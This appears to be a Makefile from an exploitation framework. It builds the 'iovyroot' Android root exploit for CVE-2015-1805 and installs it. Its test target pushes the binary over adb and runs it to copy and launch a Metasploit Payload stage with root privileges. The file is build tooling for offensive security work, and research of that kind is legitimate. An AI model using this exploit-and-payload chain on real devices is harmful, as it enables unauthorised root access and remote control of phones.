
all: build

build:
	ndk-build NDK_PROJECT_PATH=. APP_BUILD_SCRIPT=./jni/Android.mk

install: build
	cp libs/armeabi-v7a/iovyroot ../../../../data/exploits/CVE-2015-1805.elf

test: build
	adb push libs/armeabi-v7a/iovyroot /data/local/tmp/iovyroot
	adb shell /data/local/tmp/iovyroot "mkdir /data/local/tmp/okteu && cd /data/local/tmp/okteu && cp /data/data/com.metasploit.stage/files/ftqot /data/local/tmp/uqvwx.jar && chmod 766 /data/local/tmp/uqvwx.jar && dalvikvm -Xbootclasspath:/system/framework/core.jar -cp /data/local/tmp/uqvwx.jar com.metasploit.stage.Payload"

clean:
	rm -rf libs
	rm -rf obj

